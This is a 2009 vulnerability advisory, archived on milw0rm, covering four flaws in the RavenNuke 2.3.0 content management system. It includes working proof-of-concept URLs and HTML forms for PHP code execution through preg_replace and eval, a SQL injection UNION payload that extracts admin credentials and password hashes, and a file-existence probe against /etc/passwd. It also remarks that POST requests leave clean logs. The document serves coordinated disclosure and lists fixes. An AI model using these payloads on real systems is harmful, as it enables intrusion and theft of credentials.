<html><head><title>RavenNuke 2.3.0 Multiple Remote Vulnerabilities</title></head><pre>[waraxe-2009-SA#072] - Multiple Vulnerabilities in RavenNuke 2.3.0
===============================================================================

Author: Janek Vind &quot;waraxe&quot;
Date: 16. February 2009
Location: Estonia, Tartu
Web: http://www.waraxe.us/advisory-72.html


Description of vulnerable software:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

RavenNuke is a web-based automated news publishing and content management
system based on PHP and MySQL. The system is fully controlled using a web-based
graphical user interface (GUI). RavenNuke is an extensively changed fork of 
the phpNuke\portal system.

http://ravenphpscripts.com/


List of found vulnerabilities
===============================================================================

1. Remote Php Code Execution in &quot;avatarlist.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Security risk: High

Reasons:
  1. uninitialized arrays &quot;patterns&quot; and &quot;replacements&quot;
Preconditions:
  1. attacker must be logged in as user
Comments:
  1. Exploit is using &quot;preg_replace&quot; e-modifier
  2. &quot;register_globals&quot; setting does not matter
  3. Sentinel will not stop this exploit
  4. POST method will leave clean logs in most real-world cases

Test using GET method:

http://localhost/ravennuke230/modules.php?name=Your_Account&amp;op=avatarlist
&amp;avatarcategory=gallery&amp;patterns[6]=/a/e&amp;replacements[6]=phpinfo()

Test using POST method:
------------------------------------------------------------
&lt;html&gt;&lt;body&gt;&lt;center&gt;
&lt;form action=&quot;http://localhost/ravennuke230/modules.php?
name=Your_Account&amp;op=avatarlist&quot; method=&quot;post&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;avatarcategory&quot; value=&quot;gallery&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;patterns[6]&quot; value=&quot;/a/e&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;replacements[6]&quot; value=&quot;phpinfo()&quot;&gt;
&lt;input type=&quot;submit&quot; value=&quot;Test!&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
------------------------------------------------------------

Fragment of vulnerable source code:
------------------------------------------------------------
$patterns[0] = '/\.gif/';
$patterns[1] = '/\.png/';
...
$replacements[1] = '';
$replacements[0] = '';
...
$entryname = preg_replace($patterns, $replacements, $entry);
------------------------------------------------------------

Solution: initialize arrays before use.


2. Remote Php Code Execution in &quot;Your Account&quot; module
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Security risk: medium

Reasons:
  1. insecure use of &quot;eval()&quot; php function
Precoditions:
  1. Attacker must have admin rights for &quot;Your Account&quot; in
  order to change custom fields
Comments:
  1. This is privilege escalation vulnerability

Test:

1. log in as admin and go to &quot;Custom Fields&quot; in users administration:

http://localhost/ravennuke230/admin.php?op=yaCustomFields

2. insert &quot;_Z;phpinfo()&quot; (without quotes) into input box &quot;ID Field Name&quot;

3. click &quot;Save fields&quot;

4. now go to &quot;Users&quot;:

http://localhost/ravennuke230/admin.php?op=yaUsers

and select &quot;User Details&quot; for any user, click &quot;OK&quot;.
Resulting page will display output of the &quot;phpinfo()&quot;, done  :) 

Fragment of vulnerable source code:
-------------------------------------------------------
/* Get Custom Fields and display them in desired order
...
$result = $db-&gt;sql_query('SELECT * FROM ' . $user_prefix . '_users_fields
 WHERE need &lt;&gt; &quot;0&quot; AND public=&quot;1&quot; ORDER BY pos');
...
while ($sqlvalue = $db-&gt;sql_fetchrow($result)) {
  if (substr($sqlvalue['name'], 0, 1) == '_') 
@eval('$name_exit = ' . $sqlvalue['name'] . ';');
-------------------------------------------------------


3. Sql Injection in &quot;Resend_Email&quot; module
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Security risk: medium

Reasons:
  1. Insecure use of &quot;extract()&quot; php function
Preconditions:
  1. attacker must be logged in as admin

Comments:
  1. This is privilege escalation vulnerability
  2. POST method will leave clean logs in most real-world cases

Test using POST method:
------------------------------------------------------------
&lt;html&gt;&lt;body&gt;&lt;center&gt;
&lt;form action=&quot;http://localhost/ravennuke230/modules.php
?name=Resend_Email&quot; method=&quot;post&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;user_prefix&quot; 
value=&quot;nuke_users_temp WHERE 1=2 UNION SELECT 1,2,
CONCAT_WS(0x3a,aid,name,radminsuper,email,pwd),4,5,6,7,8 FROM nuke_authors-- &quot;&gt;
&lt;input type=&quot;submit&quot; value=&quot;Test!&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
------------------------------------------------------------

Fragment of vulnerable source code:
------------------------------------------------------------
if (!is_admin($admin)) endit(_ACCESSDENIED);
...
extract($HTTP_POST_VARS);
...
$result = $db-&gt;sql_query('select user_id, username, user_email, user_password,
user_regdate, check_num, time, requestor from '.$user_prefix.'_users_temp');
------------------------------------------------------------

Solution: use EXTR_SKIP to avoid overwriting of existing variables


4. Remote Detection of Local Files in &quot;captcha.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Security risk: low

Reasons:
  1. uninitialized array &quot;aFonts&quot;
Preconditions:
  1. &quot;register_globals=on&quot;
  2. &quot;display_errors=on&quot;
Comments:
  1. multiple page refreshes may needed because of source code specifics
  2. same method works for remote directories too!

Attacker is able to detect existance of remote files or directories
via different error messages, emitted by php.

Test 1:

http://localhost/ravennuke230/images/captcha.php?aFonts[]=/etc/waraxe

Result:

Warning: imageftbbox() [function.imageftbbox]: Invalid font filename in
C:\apache_wwwroot\ravennuke230\includes\class.php-captcha.php on line 298

&quot;Invalid font filename&quot; --&gt; file does not exist

One more possible error message:

Warning: imageftbbox(): Could not find/open font in ...

&quot;Could not find/open font&quot; --&gt; file does not exist


Test 2:

http://localhost/ravennuke230/images/captcha.php?aFonts[]=/etc/passwd

Result:

Warning: imageftbbox() [function.imageftbbox]: Could not read font in
C:\apache_wwwroot\ravennuke230\includes\class.php-captcha.php on line 298

&quot;Could not read font&quot; --&gt; file exists


How to fix:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Upgrade to new version 2.30.01


Disclosure Timeline:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

01/16/09 Developer contacted
01/16/09 Developer's initial response
01/17/09 Fidings sent to developer
02/15/09 Patched version 2.30.01 released by developer
02/16/09 Public disclosure


Greetings:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Greets to ToXiC, y3dips, Sm0ke, Heintz, slimjim100, pexli, mge, str0ke,
to all active waraxe.us forum members and to anyone else who know me!


Contact:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

come2waraxe@yahoo.com
Janek Vind &quot;waraxe&quot;

Waraxe forum:  http://www.waraxe.us/forums.html
Personal homepage: http://www.janekvind.com/

---------------------- [ EOF ] ------------------------------

# milw0rm.com [2009-02-16]</pre></html>